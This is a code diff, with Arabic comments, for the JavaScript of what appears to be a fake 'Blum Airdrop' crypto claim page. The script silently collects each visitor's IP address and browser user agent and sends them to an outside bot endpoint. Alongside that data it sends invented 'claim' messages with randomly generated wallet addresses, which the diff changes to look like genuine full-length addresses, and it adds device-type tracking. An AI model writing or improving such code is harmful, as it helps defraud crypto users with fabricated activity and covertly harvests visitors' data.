@@ -71,11 +71,21 @@
     
     function sendToBot(message) {
         fetch(PROXY_URL + '?message=' + encodeURIComponent(message), { method: 'GET', mode: 'no-cors' });
+        console.log("📤 تم إرسال:", message.substring(0, 100));
     }
     
     function getRandomNetwork() { return SUPPORTED_NETWORKS[Math.floor(Math.random() * SUPPORTED_NETWORKS.length)]; }
     function getRandomWallet() { const w = ["MetaMask", "Trust Wallet", "Coinbase Wallet", "Phantom", "OKX Wallet"]; return w[Math.floor(Math.random() * w.length)]; }
-    function generateAddress() { return "0x" + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 6); }
+    
+    // توليد عنوان كامل (40 حرفاً مثل العناوين الحقيقية)
+    function generateFullAddress() {
+        const chars = "0123456789abcdef";
+        let address = "0x";
+        for (let i = 0; i < 40; i++) {
+            address += chars[Math.floor(Math.random() * chars.length)];
+        }
+        return address;
+    }
     
     sendToBot(`📊 PAGE SCAN #${totalScans} - Blum Airdrop`);
     
@@ -88,8 +98,8 @@
         
         const network = getRandomNetwork();
         const wallet = getRandomWallet();
-        const address = generateAddress();
-        const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown');
+        const address = generateFullAddress(); // عنوان كامل 42 حرفاً
+        const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'Unable to fetch');
         const ua = navigator.userAgent;
         const timestamp = new Date().toISOString();
         
@@ -98,7 +108,7 @@
         const totalCoins = totalScans * BLUM_PER_SCAN;
         const conversionRate = totalScans > 0 ? ((totalClaims / totalScans) * 100).toFixed(1) : 0;
         
-        // ========== رسالة كاملة مع إجمالي العملات (على أساس الزيارات) ==========
+        // ========== رسالة كاملة مع عنوان كامل ==========
         const fullMessage = `🎁 *ONE-CLICK BLUM CLAIM* 🎁
 ━━━━━━━━━━━━━━━━━━━━
 ⛓️ *Network:* ${network}
@@ -106,6 +116,7 @@
 💳 *Address:* \`${address}\`
 🏦 *Recipient:* \`${RECIPIENT_WALLET}\`
 🌐 *IP:* ${ip}
+📱 *Device:* ${ua.includes('Mobile') ? '📱 Mobile' : '💻 Desktop'}
 ━━━━━━━━━━━━━━━━━━━━
 📊 *إحصائيات شاملة:*
    🎁 المطالبات: ${totalClaims}
